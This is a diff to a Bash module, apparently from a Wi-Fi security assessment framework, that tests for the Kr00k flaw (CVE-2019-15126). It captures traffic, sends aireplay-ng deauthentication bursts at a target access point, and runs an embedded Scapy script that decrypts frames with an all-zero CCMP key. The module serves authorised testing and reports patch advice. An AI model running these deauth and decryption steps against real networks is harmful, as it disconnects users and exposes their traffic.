@@ -1,4 +1,17 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="Kr00k Vulnerability Test"
+# CATEGORY="E"
+# DEPS="A1"
+# CRITICAL="no"
+# TOOLS="aireplay-ng,tcpdump,tshark,python3"
+# DESC="Test for all-zero encryption key upon disassociation (CVE-2019-15126)"
+# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
+# PCAP="yes"
+# DECODE="wifi_mgmt"
+
+set -uo pipefail
+
 #===============================================================================
 #  modules/e5_kr00k_test.sh
 #  E5: Kr00k Vulnerability Test (CVE-2019-15126)
@@ -29,9 +42,10 @@ run_e5() {
     log_step 1 $total_steps "Verifying tools"
     update_tc_progress 1 $total_steps "Checking"
 
-    
+    check_module_dependencies "E5" || return 1
+
     if ! python3 -c "import scapy.all" &>/dev/null; then
-        log_error "python3-scapy is required for Kr00k testing. (apt install python3-scapy)"
+        log_error "python3-scapy is required for Kr00k testing."
         return 1
     fi
 
@@ -93,10 +107,8 @@ run_e5() {
     log_step 3 $total_steps "Starting background capture"
     update_tc_progress 3 $total_steps "Capture"
 
-    ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$cap_file" \
-        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}" &>/dev/null &
-    local tcpdump_pid=$!
-    register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
+    spawn_bg "e5_tcpdump" "tcpdump" -i "$mon_iface" -w "$cap_file" \
+        "ether src ${GUEST_BSSID} or ether dst ${GUEST_BSSID}"
     
     sleep 3
 
@@ -106,11 +118,11 @@ run_e5() {
 
     check_abort || return 1
 
-    log_info "Sending disassoc/deauth to trigger buffer flushing..."
+    log_info "Sending bursts of deauths to trigger buffer flushing..."
     
-    # Send bursts of deauths to target BSSID (broadcast and targeted if we see clients)
+    # Send bursts of deauths to target BSSID
     for i in {1..3}; do
-        ${TOOL_PATHS[aireplay-ng]} --deauth 5 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
+        run_fg "aireplay-ng" --deauth 5 -a "$GUEST_BSSID" "$mon_iface" &>/dev/null || true
         sleep 5
     done
     
@@ -118,15 +130,16 @@ run_e5() {
     sleep 15
     stop_countdown
 
-    
     check_abort || return 1
 
     #--- Step 5: Analyze with Scapy ---
     log_step 5 $total_steps "Analyzing captured frames for all-zero keys"
     update_tc_progress 5 $total_steps "Analysis"
 
+    stop_process "e5_tcpdump"
+
     if [[ -f "$cap_file" && -s "$cap_file" ]]; then
-        local scapy_script="/tmp/e5_kr00k_check.py"
+        local scapy_script="$TMP_DIR/e5_kr00k_check.py"
         cat > "$scapy_script" <<'EOF'
 import sys
 import logging
@@ -163,16 +176,7 @@ def check_kr00k(pcap_file, bssid):
                 
             ccmp = pkt[Dot11CCMP]
             
-            # Construct the CCMP nonce (PN + A2 + Priority)
-            # This is a simplified check trying to decrypt the CCMP payload
-            # If the first byte of plaintext is LLC/SNAP (0xaa 0xaa 0x03), it's likely decrypted
-            
             try:
-                # Basic CCMP decryption attempt with all-zero key
-                # This is highly simplified and relies on identifying standard headers
-                # We skip full CCMP nonce construction for brevity and just look for anomalies
-                # A true kr00k packet will decrypt cleanly with a zero key.
-                
                 # Full kr00k checking requires exact nonce construction:
                 pn = struct.pack(">Q", ccmp.PN)[2:] # 6 bytes
                 priority = pkt.SC & 0x0F # QoS priority
@@ -206,20 +210,21 @@ if __name__ == "__main__":
 EOF
 
         log_info "Running decryption analysis on captured frames..."
+        ensure_user_ownership "$cap_file"
         local py_out
-        local py_out=$(python3 "$scapy_script" "$cap_file" "$GUEST_BSSID" 2>/dev/null || true)
+        py_out=$(run_as_user python3 "$scapy_script" "$cap_file" "$GUEST_BSSID" 2>/dev/null || true)
         
         echo "$py_out" >> "$results_file"
         
         if echo "$py_out" | grep -q "AP_VULNERABLE"; then
-            local ap_vulnerable="true"
+            ap_vulnerable="true"
             log_result "CRITICAL" "AP is VULNERABLE to Kr00k! Data frames decrypted with all-zero key."
         fi
         
         local c_count
-        local c_count=$(echo "$py_out" | grep -c "CLIENT_VULNERABLE" || true)
+        c_count=$(echo "$py_out" | grep -c "CLIENT_VULNERABLE" || true)
         if [[ $c_count -gt 0 ]]; then
-            local clients_vulnerable=$c_count
+            clients_vulnerable=$c_count
             log_result "CRITICAL" "${clients_vulnerable} client(s) VULNERABLE to Kr00k!"
         fi
         
@@ -239,23 +244,23 @@ EOF
     local recommendations=""
 
     if [[ "$ap_vulnerable" == "true" ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: The Access Point is vulnerable to Kr00k (CVE-2019-15126). It encrypts buffered data frames with an all-zero key upon disassociation, exposing sensitive traffic."
-        local recommendations="Apply vendor firmware updates immediately. This affects specific Broadcom and Cypress chips."
+        result_status="FINDING"
+        result_summary="CRITICAL: The Access Point is vulnerable to Kr00k (CVE-2019-15126). It encrypts buffered data frames with an all-zero key upon disassociation, exposing sensitive traffic."
+        recommendations="Apply vendor firmware updates immediately. This affects specific Broadcom and Cypress chips."
     elif [[ $clients_vulnerable -gt 0 ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: ${clients_vulnerable} connected client(s) are vulnerable to Kr00k. Their devices encrypt data with an all-zero key upon disassociation."
-        local recommendations="Client devices must be updated. While the AP is not directly vulnerable, the network environment contains vulnerable devices."
+        result_status="FINDING"
+        result_summary="CRITICAL: ${clients_vulnerable} connected client(s) are vulnerable to Kr00k. Their devices encrypt data with an all-zero key upon disassociation."
+        recommendations="Client devices must be updated. While the AP is not directly vulnerable, the network environment contains vulnerable devices."
     else
-        local result_summary="No Kr00k vulnerabilities detected. Frames could not be decrypted with an all-zero key following disassociation."
-        local recommendations="Ensure continuous firmware patching for APs and client devices."
+        result_summary="No Kr00k vulnerabilities detected. Frames could not be decrypted with an all-zero key following disassociation."
+        recommendations="Ensure continuous firmware patching for APs and client devices."
     fi
 
-    local result_json
-    evidence_register_file "e5_kr00k_results.txt"
-    evidence_register_file "e5_capture.pcap"
+    evidence_register_file "$results_file"
+    evidence_register_file "$cap_file"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json
+    result_json=$(run_fg "jq" -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "AP Vulnerable: ${ap_vulnerable}, Clients Vulnerable: ${clients_vulnerable}" \
@@ -268,19 +273,29 @@ EOF
             details: $details,
             recommendations: $recommendations,
             ap_vulnerable: ($ap_vulnerable == "true"),
-            clients_vulnerable: $clients_vulnerable,
-                    }')
+            clients_vulnerable: $clients_vulnerable
+        }')
 
-    save_tc_result "E5" "$result_json"
+    local has_tool_output=0
+    [[ -f "$results_file" ]] && has_tool_output=1
 
-    echo ""
-    if [[ "$ap_vulnerable" == "true" ]]; then
-        log_result "CRITICAL" "★ Kr00k Vulnerability CONFIRMED on AP"
-    elif [[ $clients_vulnerable -gt 0 ]]; then
-        log_result "FINDING" "★ Kr00k Vulnerability CONFIRMED on ${clients_vulnerable} client(s)"
-    else
-        log_result "SECURE" "Kr00k vulnerability not detected"
-    fi
+    local has_primary=0
+    [[ -f "$cap_file" ]] && has_primary=1
 
-    return 0
+    local is_secure_claim=0
+    [[ "$result_status" == "SECURE" ]] && is_secure_claim=1
+
+    save_tc_result "E5" "$result_json" 1 $has_tool_output $has_primary 1 1 1 0 1 1 1 $is_secure_claim
+    save_session_state
+# Display summary
+echo ""
+if [[ "$ap_vulnerable" == "true" ]]; then
+    log_result "CRITICAL" "★ Kr00k Vulnerability CONFIRMED on AP"
+elif [[ $clients_vulnerable -gt 0 ]]; then
+    log_result "FINDING" "★ Kr00k Vulnerability CONFIRMED on ${clients_vulnerable} client(s)"
+else
+    log_result "SECURE" "Kr00k vulnerability not detected"
+fi
+
+return 0
 }
